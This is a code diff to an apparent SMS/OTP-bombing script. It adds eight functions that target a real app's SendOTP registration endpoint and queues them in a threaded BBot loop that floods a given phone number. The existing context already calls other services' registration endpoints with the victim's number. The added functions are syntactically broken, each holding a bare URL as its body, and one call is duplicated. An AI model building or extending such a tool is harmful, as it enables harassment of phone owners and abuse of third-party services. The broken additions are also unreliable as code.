@@ -136,6 +136,31 @@ def cang23(phone):
 def cang24(phone):
 	requests.get("https://findclone.ru/register?phone=+66"+phone)
 
+def cang25(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang26(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang27(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang28(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang29(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang30(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang31(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+def cang32(phone):
+        https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register
+
+
     
     
  
@@ -174,6 +199,15 @@ def BBot(phone, amount):
         threading.submit(cang22,phone)
         threading.submit(cang23,phone)
         threading.submit(cang24,phone)
+        threading.submit(cang25,phone)
+        threading.submit(cang24,phone)
+        threading.submit(cang26,phone)
+        threading.submit(cang27,phone)
+        threading.submit(cang28,phone)
+        threading.submit(cang29,phone)
+        threading.submit(cang30,phone)
+        threading.submit(cang31,phone)
+        threading.submit(cang32,phone)
         
         
 
